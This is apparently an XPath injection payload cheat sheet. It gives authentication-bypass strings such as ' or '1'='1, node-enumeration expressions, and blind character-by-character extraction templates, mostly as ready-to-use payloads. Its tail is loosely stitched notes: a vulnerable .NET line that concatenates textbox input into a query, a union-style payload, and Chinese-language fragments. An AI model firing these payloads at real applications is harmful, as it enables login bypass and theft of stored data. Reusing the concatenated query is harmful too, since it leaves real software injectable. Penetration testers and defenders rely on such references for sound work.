# XPATH injection
XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.

## Exploitation
Similar to SQL : "string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"
```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
```

## Blind Exploitation
```
1. Size of a string
and string-length(account)=SIZE_INT

2. Extract a character
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```


## Thanks to
* [OWASP XPATH Injection](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [XPATH Blind Explorer](http://code.google.com/p/xpath-blind-explorer/)

expr = nav.Compile("string(//user[name/text()='"+TextBox1.Text+"' and password/text()='"+TextBox2.Text+"']/account/text())");

NoSuchUser'] | P | //user[name/text()='NoSuchUser

这将形成以下XPath查询:

string(//user[name/text()='Foobar'] | p | //user[name/text()='NoSuchUser' and password/text()='NoSuchPass']/account/text())

元素的属性数量是
count(path/attribute::*)
第N个属性名称是
(path/attribute::*[position()=N])

count(path/child::node()) - the count of all the nodes for the given path.
count(path/child::text()) - number of text fields children (up to 1...).
count(path/child::comment()) - number of comment nodes.
count(path/child::*) - the number of element children.
count(path/child::processing-instruction()) - the number of PI nodes.